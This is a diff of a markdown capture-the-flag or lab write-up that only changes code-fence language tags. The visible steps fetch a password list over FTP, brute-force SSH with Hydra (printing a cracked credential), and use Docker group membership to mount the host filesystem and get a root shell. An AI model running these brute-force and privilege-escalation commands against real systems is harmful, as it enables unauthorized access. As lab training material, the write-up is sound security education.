@@ -94,13 +94,13 @@ ftp 192.168.56.102
 
 Once inside the FTP server, I listed the available files:
 
-```bash
+```
 ls
 ```
 
 The following files were found:
 
-```text
+```
 information.txt
 p_lists.txt
 ```
@@ -113,7 +113,7 @@ These files looked interesting and potentially contained useful information such
 
 I downloaded both files to my local machine:
 
-```bash
+```
 get information.txt
 get p_lists.txt
 ```
@@ -124,13 +124,13 @@ The transfer completed successfully.
 
 ### Exiting FTP
 
-```bash
+```
 exit
 ```
 
 Read the contents of the files:
 
-```bash
+```
 cat information.txt
 cat p_lists.txt
 ```
@@ -150,7 +150,7 @@ hydra -l robin -P p_lists.txt 192.168.56.102 ssh
 
 Hydra successfully discovered valid SSH credentials:
 
-```text
+```
 [22][ssh] host: 192.168.56.102   login: robin   password: k4vr3ndh4nh4ck3r
 ```
 
@@ -218,7 +218,7 @@ uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
 
 ### Checking Available Docker Images
 
-```bash
+```
 docker images
 ```
 
@@ -233,7 +233,7 @@ alpine       latest  28f6e2705743   5 years ago    5.61MB
 
 I used Docker to mount the host filesystem and spawn a root shell:
 
-```bash
+```
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 ```
 
@@ -241,11 +241,11 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 
 ### Root Access Achieved
 
-```bash
+```
 whoami
 ```
 
-```text
+```
 root
 ```
 
@@ -255,24 +255,24 @@ root
 
 Navigate to root directory:
 
-```bash
+```
 cd /root
 ls
 ```
 
-```text
+```
 root.txt
 ```
 
 Read the flag:
 
-```bash
+```
 cat root.txt
 ```
 
-```text
+
 Congratulations
 You Reached Root...!
 Root-Flag
 FLAG{r00t-H4ckTh3Pl4n3t0nc34g41n}
-```
+
